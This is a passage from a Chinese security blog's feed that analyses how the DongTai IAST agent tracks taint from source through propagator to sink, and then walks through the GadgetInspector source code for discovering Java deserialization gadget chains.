class="line">          SpyDispatcherImpl#collectMethodPool</span><br><span class="line">              HttpImpl.solveHttp</span><br><span class="line">              SourceImpl.solveSource</span><br><span class="line">              PropagatorImpl.solvePropagator</span><br><span class="line">              SinkImpl.solveSink</span><br></pre></td></tr></table></figure><h4 id="3-2-1-污点跟踪逻辑"><a href="#3-2-1-污点跟踪逻辑" class="headerlink" title="3.2.1 污点跟踪逻辑"></a>3.2.1 污点跟踪逻辑</h4><p><strong>重点关注全局变量EngineManager</strong></p><ul><li><p>EngineManager.TRACK_MAP</p><ul><li>存的污点传播路径</li><li>当开始准备跟踪时，进行初始化，如SourceImpl#sloveSource.</li><li>当跟踪完成时，进行remove，如SpyDispatcherImpl#leaveHttp</li></ul></li><li><p>EngineManager.TAINT_HASH_CODES</p><ul><li>存的污点值的hash</li></ul></li><li><p>EngineManager.TAINT_RANGES_POOL</p><ul><li>存的污点值所在范围，污点一般为string，例如为hash所对应的string的子串</li></ul></li></ul><p><strong>重点关注变量MethodEvent</strong></p><p>其中<br>source = event.inValue / event.inValueString<br>target = event.outValue / event.outValueString</p><p>source:O = event.object<br>source:P = event.argumentArray<br>target:O = event.<br>target:P = event.<br>target:R = event.returnValue/event.OutValue</p><p><strong>具体的流程如下：</strong></p><h5 id="1-HttpImpl-solveHttp"><a href="#1-HttpImpl-solveHttp" class="headerlink" title="1. HttpImpl#solveHttp"></a>1. HttpImpl#solveHttp</h5><p>一次请求到达了应用程序，首先进入 http 节点处理逻辑，进行标记和预处理。</p><ul><li>重放处理/标记</li><li>黑名单/后缀</li><li>增加http 头</li></ul><h5 id="2-SourceImpl-solveSource"><a href="#2-SourceImpl-solveSource" class="headerlink" title="2. SourceImpl#solveSource"></a>2. SourceImpl#solveSource</h5><p>请求进入到 source 点，将 event 放入 EngineManager.TRACK_MAP 中，将 source 的结果放入了 EngineManager.TAINT_POOL 污点池中。</p><p>Source的传播比较单一，一般只有</p><ul><li>O-R</li><li>P-R</li></ul><p>具体逻辑如下：</p><ul><li>如果method return为空或者为int之类的无效污染，退出</li><li>如果method 为getAttrribute，那么仅允许白名单内的arg，这两步是为了执行效率考虑</li><li>将event 加入EngineManager.TRACK_MAP 中</li><li>将source 的结果放入了 EngineManager.TAINT_HASH_CODES/TAINT_RANGES_POOL 污点池中：<strong>如果source的结果是Map、Collection、Array之类的，会进一步遍历其所有值，都加入TAINT_HASH_CODES/TAINT_RANGES_POOL</strong></li></ul><p><img src="/images/pasted-310.png" alt="upload successful"></p><blockquote><p>疑问：solveSource 中只有P-R，没有处理O-R的情况，是漏掉了？</p></blockquote><p><img src="/images/pasted-311.png" alt="upload successful"></p><blockquote><p>SourceImpl 是起点，起点的inValue 对结果并没有什么影响。重要的只是outValue，是整个污染连的起点。因此简单讲inValue设置成argumentArray并不会影响结果。</p></blockquote><h5 id="3-PropagatorImpl-solvePropagator"><a href="#3-PropagatorImpl-solvePropagator" class="headerlink" title="3. PropagatorImpl#solvePropagator"></a>3. PropagatorImpl#solvePropagator</h5><p>请求进入propagator 节点时，根据配置判断传播节点的参数是否存在于污点池中，如果是，则将传播节点 event 放入 EngineManager.TRACK_MAP 中。</p><p>Propagate有很多种传播逻辑：</p><ul><li>P-R </li><li>P-O</li><li>P-P 这个少见</li><li>O-P</li><li>O-O 这个也少见，只有一条规则java.lang.StringBuffer.setLength(int)</li><li>O-R</li></ul><p>除此之外，Propagate 还可以由多个条件组合，因此逻辑比较复杂。</p><p><strong>入污点的处理逻辑如下：</strong></p><ul><li><p>如果source 为O，则inValue 为event.object，判断inValue 是否在历史的EngineManager.TAINT_HASH_CODES 中，如果在，则</p><ul><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li><li><p>如果source 为Px，则inValue 为数组，其中每个值为event.argumentArray[x]，判断event.argumentArray[x] 是否在历史的EngineManager.TAINT_HASH_CODES 中，如果在，则组成新的Array，赋值给inValue，同样</p><ul><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li><li><p>如果有多条件组合</p><ul><li>将每个条件分拆，存入inValues数组</li><li>每一个条件的inValue值过一遍污点池，不在的则剔除</li><li>这里多条件处理取巧了，如果有and，那么必须每个条件都满足conditionSources.length == condition</li><li>最后同样的将event.setInValue(inValues.toArray)</li><li>将event 加入EngineManager.TRACK_MAP</li><li>调用setTarget，设置出污点</li></ul></li></ul><p><strong>出污点的处理逻辑如下：</strong></p><ul><li><p>如果target 为O</p><ul><li>event.setOutValue(event.object)</li><li>trackTaintRange</li></ul></li><li><p>如果target 为R</p><ul><li>event.setOutValue(event.returnValue);</li><li>trackTaintRange</li></ul></li><li><p>如果target 为P，与inValues类似，outValues 为每一个对应的argumentArray[x]</p><ul><li>event.setOutValue(outValues.toArray());</li><li>针对每一个x，trackTaintRange(propagator, event)</li></ul></li></ul><blockquote><p>疑问：其中trackTaintRange 比较疑惑，还未发现其具体功能？</p></blockquote><p>随着程序的多次调用，程序还会再次进入多次传播节点，这些节点也会被放入 EngineManager.TRACK_MAP 中。</p><blockquote><p>疑问：P-P 逻辑中，都是从event.argumentArray 中获取参数，但是此时是在after中获取的，也就是执行完成，source P 其实已经变成了target P，这里可能存在问题，待验证。</p></blockquote><p><img src="/images/pasted-312.png" alt="upload successful"></p><p>TODO：这里有条规则，待验证。</p><p><img src="/images/pasted-314.png" alt="upload successful"></p><h5 id="4-SinkImpl-solveSink"><a href="#4-SinkImpl-solveSink" class="headerlink" title="4. SinkImpl#solveSink"></a>4. SinkImpl#solveSink</h5><p>应用程序走到最后的 sink 点时，根据 sink 点的配置，判断 sink 点的参数是不是在 TAINT_POOL 中，如果是，则将 sink 点写入 EngineManager.TRACK_MAP 中。</p><p>Sink传播逻辑也很简单，只有source：</p><ul><li>P</li><li>O</li></ul><p>具体逻辑如下：</p><ul><li>如果是P，则获取对应P的值event.argumentArray[x]，判断是否在污点池内，如果在则<ul><li>event.setInValue(sourceValue)</li><li>将event 加入EngineManager.TRACK_MAP</li></ul></li><li>如果是O，则判断event.object 是否在污点池内，如果在则同样<ul><li>event.setInValue(event.object)</li><li>将event 加入EngineManager.TRACK_MAP</li></ul></li></ul><p><img src="/images/pasted-307.png" alt="upload successful"></p><h5 id="5-SpyDispatcherImpl-leaveHttp"><a href="#5-SpyDispatcherImpl-leaveHttp" class="headerlink" title="5. SpyDispatcherImpl#leaveHttp"></a>5. SpyDispatcherImpl#leaveHttp</h5><p>在应用程序执行完，回到http 节点，最后执行到 leaveHttp 时，会调用 GraphBuilder 构造污点调用图并发送至云端。</p><h3 id="3-3-其他漏洞检测"><a href="#3-3-其他漏洞检测" class="headerlink" title="3.3 其他漏洞检测"></a>3.3 其他漏洞检测</h3><ul><li>越权检测</li><li>CRYPTO_WEEK_RANDOMNESS</li><li>CRYPTO_BAD_MAC</li><li>CRYPTO_BAC_CIPHERS</li><li>COOKIE_FLAGS_MISSING</li></ul><h2 id="0x4-测试"><a href="#0x4-测试" class="headerlink" title="0x4 测试"></a>0x4 测试</h2><p>暂时不关注，待后续有需求再补充</p><h2 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5 总结"></a>0x5 总结</h2><p>被动IAST 的核心逻辑是整个污点链的跟踪，维护了一个污点hash表，从污点source，再通过默认收集的propagate 规则，收集其传播之后的污点值，都收集到污点hash表中，最终在sink中判断是否是污点成功传播至此。</p><p>分析过程中发现的一些问题：</p><ol><li>filter 规则貌似当作了普通的propagate 规则，并没有做其他处理，这个难道不会造成误报吗？<br> <img src="/images/pasted-306.png" alt="upload successful"></li><li>propagate P-P传播的时候，都是取得event.argumentArray，这里可能存在问题，待测试。</li><li>比较依赖配置的propagate 规则，这里包含了所有的可能导致污点变化的传播，如果不全可能导致漏报。</li><li>Array/Map 之类在传播过程中，会导致误报，因为规则仅支持P级粒度的映射。</li></ol><p>在分析DongTai IAST之后，发现自己之前对被动IAST 完全误解了。</p><h2 id="0x6-参考"><a href="#0x6-参考" class="headerlink" title="0x6 参考"></a>0x6 参考</h2><ul><li>[1] <a href="https://su18.org/post/dongtai/#sinksourcepropagatorhttp">洞态 IAST 试用</a></li><li>[2] <a href="https://anemone.top/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/">悬镜技术分享笔记——灰盒测试</a></li><li>[3] <a href="https://github.com/HXSecurity/DongTai">HXSecurity/DongTai</a></li><li>[4] <a href="https://github.com/HXSecurity/DongTai-agent-java">HXSecurity/DongTai-agent-java</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x1-背景知识&quot;&gt;&lt;a href=&quot;#0x1-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0x1 背景知识&quot;&gt;&lt;/a&gt;0x1 背景知识&lt;/h2&gt;&lt;p&gt;IAST 概念虽然很早就提出了，但是在实际使用情况中，因为其生产无侵入性与漏误报情况，实际使用效果还是不过的。&lt;/p&gt;
&lt;h3 id=&quot;1-1-IAST&quot;&gt;&lt;a href=&quot;#1-1-IAST&quot; class=&quot;headerlink&quot; title=&quot;1.1 IAST&quot;&gt;&lt;/a&gt;1.1 IAST&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;DAST (Dynamic Application Security Testing)&lt;/li&gt;
&lt;li&gt;IAST (Interactive Application Security Testing)&lt;/li&gt;
&lt;li&gt;RASP（Runtime Application Self-protection）&lt;/li&gt;
&lt;li&gt;SAST (Static Application Security Testing)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;属IAST 最模糊，与三者都有纠缠。&lt;/p&gt;
&lt;h3 id=&quot;1-2-主动-与-被动&quot;&gt;&lt;a href=&quot;#1-2-主动-与-被动&quot; class=&quot;headerlink&quot; title=&quot;1.2 主动 与 被动&quot;&gt;&lt;/a&gt;1.2 主动 与 被动&lt;/h3&gt;&lt;h4 id=&quot;1-2-1-主动IAST&quot;&gt;&lt;a href=&quot;#1-2-1-主动IAST&quot; class=&quot;headerlink&quot; title=&quot;1.2.1 主动IAST&quot;&gt;&lt;/a&gt;1.2.1 主动IAST&lt;/h4&gt;&lt;p&gt;主动IAST很简单，可以简单理解为 动态IAST = DAST + RASP&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/pasted-294.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="IAST" scheme="http://m0d9.me/tags/IAST/"/>
    
    <category term="DongTai" scheme="http://m0d9.me/tags/DongTai/"/>
    
  </entry>
  
  <entry>
    <title>GadgetInspector 源码分析</title>
    <link href="http://m0d9.me/2022/09/14/Tabby%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/09/14/Tabby%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</id>
    <published>2022-09-14T03:00:00.000Z</published>
    <updated>2022-10-24T09:06:06.594Z</updated>
    
    <content type="html"><![CDATA[<p>开始啃骨头了。。。</p><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>不了解算法原理基础上，去直接啃GI源码，真的是一件很困难的事情，难得有师傅们的经验总结，站在师傅们的肩膀上记录下GI的学习心得。</p><h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><ul><li>2018年Black Hat公布<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">GadgetInspector</a></li><li>2019年Longofo师傅<a href="https://paper.seebug.org/1034/#step2-passthrough_1">《Java 反序列化工具 gadgetinspector 初窥》</a>，详细跟踪了除ASM之外的知识点，重点是逆拓扑排序</li><li>2020年threedr3am<a href="https://xz.aliyun.com/t/7058#toc-4">《java反序列化利用链自动挖掘工具gadgetinspector源码浅析》</a>，重点分析了Longofo师傅未提到的ASM</li><li>2022年su18师傅<a href="https://su18.org/post/gadgetor/">《高效挖掘反序列化漏洞——GadgetInspector改造》</a>，提到了GI的不足以及改进思路</li></ul><p>当然，还有其他的许多师傅关于GI的文章，这里没有提到，不赘述。</p><a id="more"></a><h2 id="0x02-算法解析"><a href="#0x02-算法解析" class="headerlink" title="0x02 算法解析"></a>0x02 算法解析</h2><p>先抛开复杂的代码，GI的工作流程大致如下：</p><ol><li>枚举全部类以及每个类的所有方法：MethodDiscovery</li><li>生成passthrough数据流：PassthroughDiscovery</li><li>枚举passthrough调用图：CallGraphDiscovery</li><li>搜索可用的source：SourceDiscovery</li><li>搜索生成调用链：GadgetChainDiscovery</li></ol><p>其中重点的知识点有：</p><ol><li>ASM栈模拟</li><li>PassthroughDiscovery 的函数间污点传播</li></ol><h3 id="2-1-MethodDiscovery"><a href="#2-1-MethodDiscovery" class="headerlink" title="2.1 MethodDiscovery"></a>2.1 MethodDiscovery</h3><p>枚举全部类以及每个类的所有方法，保存在classes.dat、methods.dat中，分别对应类、方法，结构如下</p><p>classes.dat</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>类名</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>父类名</td><td>java/lang/Object</td></tr><tr><td>所有接口</td><td>java/io/Serializable</td></tr><tr><td>是否是接口</td><td>false</td></tr><tr><td>成员</td><td>__clojureFnMap!2!java/util/HashMap</td></tr></tbody></table><p>methods.dat</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>类名</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>方法名</td><td>hashCode</td></tr><tr><td>方法描述信息</td><td>()I</td></tr><tr><td>是否是静态方法</td><td>false</td></tr></tbody></table><p>继承关系表：inheritanceMap.dat</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>类</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>直接父类+间接父类</td><td>java/lang/Object、java/io/Serializable</td></tr></tbody></table><p>其中的字段结构，Longofo师傅文章里都有解释，这里不赘述。</p><h3 id="2-2-PassthroughDiscovery"><a href="#2-2-PassthroughDiscovery" class="headerlink" title="2.2 PassthroughDiscovery"></a>2.2 PassthroughDiscovery</h3><p>生成passthrough数据流，这里涉及到 静态分析-污点分析 的知识点了，是GI的第一个重点知识点。</p><p><img src="/images/pasted-261.png" alt="upload successful"></p><p>最终生成的</p><p>passthrough.dat：</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>类名</td><td>com/m0d9/sec/FnConstant</td></tr><tr><td>方法名</td><td>invokeCall</td></tr><tr><td>方法描述</td><td>(Ljava/lang/Object;)Ljava/lang/Object;</td></tr><tr><td>污点</td><td>0</td></tr></tbody></table><h4 id="2-2-1-污点传播函数表示约定"><a href="#2-2-1-污点传播函数表示约定" class="headerlink" title="2.2.1 污点传播函数表示约定"></a>2.2.1 污点传播函数表示约定</h4><p>简单来讲，这一步是计算所有的方法的污点参数污播规则。</p><p>例如：r = o.m(p0,…)</p><p>注意这里的前提：</p><ul><li>只考虑返回值r的污染情况</li></ul><p>那么和以下因素有关</p><ul><li>o，也即调用者，在函数内部也可以理解为this</li><li>p0,…，参数</li><li>m，方法，为什么有关？因为多态和继承。这里还没跟踪文章是如何实现的，待补充。</li></ul><p>具体规则如下：</p><ul><li>如果r和o有关，那么意味着r可以被o污染，在污点字段记为0</li><li>如何r和p有关，那么意味着r可以被参数p污染，参数从1开始计数</li></ul><p>PPT上有提到如何定义有关</p><ul><li>Assumption #1: All members of a “tainted” object are also tainted (and recursively, etc)</li><li>Assumption #2: All branch conditions are satisfiable</li></ul><blockquote><p><strong>思考</strong>：<br>如果方法内部还有调用，要怎么处理？</p></blockquote><h4 id="2-2-2-逆拓扑排序"><a href="#2-2-2-逆拓扑排序" class="headerlink" title="2.2.2 逆拓扑排序"></a>2.2.2 逆拓扑排序</h4><p>为了保证正在分析的函数，其内部调用的函数都是分析过的，或者无其他内部函数，需要对methods 进行逆拓扑排序，Longofo师傅讲的很仔细了，这里不赘述，直接引用师傅的结论。</p><p>原始的Call Graph：</p><p><img src="/images/pasted-266.png" alt="upload successful"></p><p>用逆拓扑展开成树状之后如下</p><p><img src="/images/pasted-265.png" alt="upload successful"></p><p>排序结果为：med7、med8、med3、med6、med2、med4、med1。</p><p>解决的问题：</p><ol><li>通过逆拓扑排序之后的结果，可以顺序解析，对应的是从树结构的最底端进行分析，不会存在依赖的节点未解析</li><li>解决环的问题</li></ol><p>生成这张大逆拓扑排序图之后，接着就进行遍历，计算其污点传播。</p><h4 id="2-2-3-过程内污点分析的实现"><a href="#2-2-3-过程内污点分析的实现" class="headerlink" title="2.2.3 过程内污点分析的实现"></a>2.2.3 过程内污点分析的实现</h4><p>这块threedr3am师傅有详细讲解，具体在PassthroughDataflowMethodVisitor&amp; TaintTrackingMethodVisitor 内，这里也只是简要理解其算法。</p><p>这块需要两点知识</p><ul><li>JVM </li><li>ASM 的一些基础知识。</li></ul><h5 id="1-JVM"><a href="#1-JVM" class="headerlink" title="1. JVM"></a>1. JVM</h5><blockquote><p>JAVA的运行时将方法调用信息保存在栈里，并为每个方法调用创建一个栈帧。一个栈帧内部包含着下面几个元素：</p><ul><li>局部变量表</li><li>操作数栈</li><li>方法返回地址</li><li>动态链<br>这里我们重点关注局部变量表和操作数栈。局部变量表保存一个方法中的局部变量，我们可以用索引序号的方法读写局部变量表。而操作数栈只能通过push和pop的方式进行操作。对于一个实例方法调用，局部变量表里面从0位开始按序保存着实例对象，方法参数，新定义的局部变量。在运行时，JAVA将局部变量表里面的变量加载到操作数栈上，然后经过运算，得到的结果放到操作数栈顶端，再由其他指令保存回局部变量表。所以说JAVA的局部污点分析，实际就是分析局部变量表和操作数栈之间的数据流动。</li></ul></blockquote><h5 id="2-ASM-Visitor"><a href="#2-ASM-Visitor" class="headerlink" title="2. ASM Visitor"></a>2. ASM Visitor</h5><p>GadgetInspector 是用ASM来模拟方法的调用，入参、返回，从而达到程序内污点跟踪。</p><p>接口类</p><ul><li><p>asm.ClassVisitor</p><ul><li>visit</li><li><strong>visitMethod</strong> : 指定method的相关操作</li><li>visitEnd</li><li>…</li></ul></li><li><p>asm.MethodVisitor</p><ul><li>visitCode：在进入方法的第一时间，ASM会先调用这个方法</li><li>visitInsn：在方法体中，每一个字节码操作指令的执行，ASM都会调用这个方法</li><li>visitFieldInsn：对于字段的调用，ASM都会调用这个方法</li><li><strong>visitMethodInsn</strong>：方法体内，一旦调用了其他方法，都会触发这个方法的调用</li><li>visitVarInsn：在方法体内字节码操作变量时，会被调用</li></ul></li></ul><h5 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h5><p><strong>抓住关键点：只关注ret 与this、参数的关系，能否被污染</strong> </p><ol><li><p>把TaintTrackingMethodVisitor 当做用asm模拟了jvm的执行过程即可。</p></li><li><p>只需要分析PassthroughDataflowMethodVisitor 中关于stackVars(操作数栈)、localVars(局部变量表)的操作：</p><ul><li>visitCode（在进入方法的第一时间），将(0,p(this)=0),(1,p(ag1)),…，那么需要将参数加入临时变量localVars，其中的p为污点占位</li><li>visitFieldInsn（调用字段），如果调用了this.field，则通过setStackTaint(0, taint) 设置stackVars污点</li><li>visitMethodInsn（方法调用），通过getStackTaint(retSize-1).addAll(resultTaint) 设置stackVars的污点</li><li>visitInsn return的时候，取当前栈上的最新的为污点分析结果。</li></ul></li></ol><p>注意这里 ，stackVars 用的ArrayList实现的，因此pop 和push看起来会比较晦涩，可以直接把stackVars当作栈来看待，不过get 获取的是倒过来的即可。<br>例如visitMethodInsn中的getStackTaint(retSize-1).addAll(resultTaint)，就可以理解为把最新的那个栈元素重新赋值，这样会好理解很多。</p><p>这里只是简单解释下流程，在后文CallGraphDiscovery 中在详细解释。</p><!-- > **思考**> 1. New、Assign、Store、Load 这一过程内的污点传播是完整的吗？答案不是，feild处理那块，又一个transient 判断逻辑，su18师傅有提到，这里也不讲了。> 2. 过程间的污点传播是完整的吗？答案不是，因为只考虑了返回值污染与否，参数也可能被污染，这个留待之后Tabby工具分析再细讲。> 3. java 静态分析的反射难点是如何处理的？为什么说是简化的过程内污点分析，因为这里只考虑了return，没考虑this、参数，也没考虑上下文。--><h3 id="2-3-CallGraphDiscovery"><a href="#2-3-CallGraphDiscovery" class="headerlink" title="2.3 CallGraphDiscovery"></a>2.3 CallGraphDiscovery</h3><blockquote><p>这一步和上一步类似，但检查的不再是参数与返回结果的关系，而是方法的，参数与其所调用的子方法的关系，即子方法的参数是否可以被父方法的参数所影响。</p></blockquote><p>这里强调个师傅们没讲的点，虽然都是遍历，但是有处很大的不同</p><ul><li>PassthroughDiscovery 有两次遍历<ul><li>遍历所有class的methods，生成逆拓扑图</li><li>遍历逆拓扑图，生成passthrough</li></ul></li><li>CallGraphDiscovery 只有一次遍历，遍历的是所有class</li></ul><p>两次方法 TaintTrackingMethodVisitor构造中，passthroughDataflow参数不一样。</p><p><img src="/images/pasted-270.png" alt="upload successful"></p><p><img src="/images/pasted-267.png" alt="upload successful"></p><p>callgraph.dat</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>父方法类名</td><td>com/m0d9/sec/AbstractTableModel</td></tr><tr><td>父方法</td><td>hashCode</td></tr><tr><td>父方法描述</td><td>()I</td></tr><tr><td>子方法类名</td><td>com/m0d9/sec/IFn</td></tr><tr><td>子方法</td><td>invokeCall</td></tr><tr><td>子方法描述</td><td>(Ljava/lang/Object;)Ljava/lang/Object;</td></tr><tr><td>父方法第几参</td><td>0</td></tr><tr><td>参数对象的哪个field被传递</td><td>__clojureFnMap</td></tr><tr><td>子方法第几参</td><td>0</td></tr></tbody></table><blockquote><p>为什么callgraph需要用到passthrough？代码中CallGraphDiscovery 中除了给TaintTrackingMethodVisitor 中用到了之前的passthrough 结果，就没有其他地方用到。看师傅们文章，都对这里的解释都很模糊</p></blockquote><h4 id="2-3-1-ASM-详细流程"><a href="#2-3-1-ASM-详细流程" class="headerlink" title="2.3.1 ASM 详细流程"></a>2.3.1 ASM 详细流程</h4><ul><li><p>localVars, 本地变量污染表，包含this、入参、以及函数中的其他临时变量，结构为(id，taint)，有如下接口：</p><ul><li>add：</li><li>remove：</li><li>get：</li><li>set：</li><li>setLocalTaint：设置local变量中的某个元素</li><li>getLocalTaint：</li></ul></li><li><p>stackVars 模拟的JVM栈，结果同样为(id，taint)，有如下接口：</p><ul><li>pop：出栈</li><li>push：入栈</li><li>getStackTaint：获取stack中的某个元素</li><li>setStackTaint：设置stack中的某个元素</li><li>get：和getStackTaint类似</li></ul></li></ul><p>下面详细解释一下三个ASM MethodVisitor 对应的具体localVars、stackVars 上的操作</p><ul><li>TaintTrackingMethodVisitor</li><li>PassthroughDataflowMethodVisitor</li><li>CallGraph#ModelGeneratorMethodVisitor</li></ul><h5 id="1-TaintTrackingMethodVisitor"><a href="#1-TaintTrackingMethodVisitor" class="headerlink" title="1. TaintTrackingMethodVisitor"></a>1. TaintTrackingMethodVisitor</h5><ul><li><p>visitCode</p><p>localVars 增加this, arg1, arg0, …，内容暂时为空</p></li><li><p>visitVarInsn 在方法体内字节码操作变量时，会被调用</p><p>Load 将localVars中push到stack<br>STORE 将stack中pop并赋值给LocalVars</p></li><li><p>visitFieldInsn</p><p>get 时push入栈，结果在stackVars中<br>put 时pop出栈</p></li><li><p>visitMethodInsn</p><p>处理调用返回</p></li></ul><blockquote><p>疑问：<br>此时参数已经在栈内了，哪里入栈的？是LDC/DUP之类指令</p></blockquote><p>具体的处理过程中，有两个变量：</p><ul><li>argTaint是参数的污点表，是从栈中pop取得</li><li>resultTaint 是最终的返回值污染情况</li></ul><p>具体的逻辑：</p><ul><li><p>如果被调用的函数为java.io.ObjectInputStream#defaultReadObject, 那么localVars[0] 设为argTaint[0]，localVars[0]是this</p></li><li><p>如果被调用函数在内置的PASSTHROUGH_DATAFLOW 中，那么resultTaint 加上所有的污染点id</p></li><li><p>如果被调用函数在passthroughDataflow 中，那么同样resultTaint 加上所有的污染点id</p></li><li><p>如果参数0，也就是this，是java.util.Collection/java.util.Map 接口的实现，那么也认为argTaint[0]包含所有的参数污点，并且如果返回值是return的话，那么resultTaint也要加入这些污点参数。</p></li><li><p>最后将resultTaint 入栈</p></li></ul><h5 id="2-PassthroughDataflowMethodVisitor"><a href="#2-PassthroughDataflowMethodVisitor" class="headerlink" title="2. PassthroughDataflowMethodVisitor"></a>2. PassthroughDataflowMethodVisitor</h5><ul><li><p>visitCode</p><p>localVars this, arg1, arg0, …中赋值，值为当前id</p></li><li><p>visitFieldInsn</p><p>get GETFIELD时，如果是非Transient，那么可以当作污点，把在TaintTrackingMethodVisitor中push入栈的结果打上taint标，内容为0（因为this id为0）</p></li><li><p>visitMethodInsn<br>可以当作是TaintTrackingMethodVisitor的补充，丰富resultTaint<br>具体做法是如果是构造函数，那么resultTaint取之依赖this，否则还是设成空。<br>接着获取调用的函数的passthrough，获得它的return 和 参数关系，然后通过argTaint获取参数的实际污染情况，最终加入resultTaint<br>最后调用父类的visitMethodInsn，将resultTaint 合并  </p></li></ul><h5 id="3-CallGraph-ModelGeneratorMethodVisitor"><a href="#3-CallGraph-ModelGeneratorMethodVisitor" class="headerlink" title="3. CallGraph#ModelGeneratorMethodVisitor"></a>3. CallGraph#ModelGeneratorMethodVisitor</h5><ul><li><p>visitCode<br>  localVars this, arg1, arg0, …中赋值，值为arg0，arg1，arg2…</p></li><li><p>visitFieldInsn<br>  get GETFIELD时，如果是非Transient，那么可以当作污点，把在TaintTrackingMethodVisitor中push入栈的结果打上taint标，内容为fieldname，如果已经存在，则用.拼接</p></li><li><p>visitMethodInsn<br>  对于每一个参数，通过getStackTaint 获取该的参数的污点信息。</p></li></ul><h4 id="2-3-2-passthrough-gt-callgraph"><a href="#2-3-2-passthrough-gt-callgraph" class="headerlink" title="2.3.2 passthrough-&gt;callgraph"></a>2.3.2 passthrough-&gt;callgraph</h4><p>有了以上个ASM MethodVisitor的了解，再结合Lengo师傅的例子具体走一遍分析流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyObject obj;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parentMethod</span><span class="params">(Object arg)</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        TestObject obj1 = <span class="keyword">new</span> TestObject();</span><br><span class="line">        Object obj2 = obj1.childMethod1(arg);</span><br><span class="line">        <span class="keyword">this</span>.obj.childMethod(obj2); </span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设</p><ul><li>arg 是污点</li><li>passthough 已经算出TestObject.childMehod1 的污点传播为0，1</li></ul><p>在class asm 遍历的时候</p><ol><li><p>是先遇到 ParentClass.parentMethod-&gt;obj1.childMehod1，此时会去栈中查找obj1、arg，其中obj1不是污点，arg是污点，得到obj2的污点为1。得出结论ParentClass.parentMethod-&gt;TestObject.childMehod1 的传播关系为1-&gt;1</p></li><li><p>再遇到ParentClass.parentMethod-&gt;obj1.this.obj.childMethod(obj2)，此时obj2已经入栈，污点值为1，那算得return值为0、1，不过因为return结果没有赋值，不入栈。得出结论ParentClass.parentMethod-MyObject.childMethod 的传播关系为0-obj-&gt;0 和1-&gt;1 </p></li></ol><p>可见passthrough 会影响ret栈的值，从而影响callgraph的结果。</p><h3 id="2-4-SourceDiscovery"><a href="#2-4-SourceDiscovery" class="headerlink" title="2.4 SourceDiscovery"></a>2.4 SourceDiscovery</h3><p>这一步是内置source源，以java 原声反序列化为例，在JavaSourceDiscovery#discover 中实现了定义。</p><ul><li>jackson</li><li>javaserial</li><li>xstream</li></ul><p><img src="/images/pasted-268.png" alt="upload successful"></p><p>sources.dat</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>类</td><td>java/lang/Enum</td></tr><tr><td>方法</td><td>readObject</td></tr><tr><td>方法描述</td><td>(Ljava/io/ObjectInputStream;)V</td></tr><tr><td>污染参数</td><td>1</td></tr></tbody></table><p>以javaserial 为例，在SimpleSourceDiscovery内。除了source原，还有几个接口，以支持以上的不同反序列化框架。</p><ul><li>SourceDiscovery：源source点</li><li>SerializableDecider：决策</li><li>ImplementationFinder：解决多态问题</li></ul><h3 id="2-5-GadgetChainDiscovery"><a href="#2-5-GadgetChainDiscovery" class="headerlink" title="2.5 GadgetChainDiscovery"></a>2.5 GadgetChainDiscovery</h3><p>这一步会从source 开始遍历，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。</p><p><img src="/images/pasted-269.png" alt="upload successful"></p><h4 id="2-5-1-BSF-广度优先搜索"><a href="#2-5-1-BSF-广度优先搜索" class="headerlink" title="2.5.1 BSF 广度优先搜索"></a>2.5.1 BSF 广度优先搜索</h4><p>具体可以看discover中的那个循环</p><ul><li>通过动态对methodsToExplore 增加元素，实现递归搜索</li><li>methodsToExplore add，非push增加元素，因此是广度优先</li><li>exploredMethods 控制了每个Method节点+参数位置 只进行一次搜索</li></ul><p>过程中，生成了接口实现方法关系表 methodimpl.data</p><p><img src="/images/pasted-277.png" 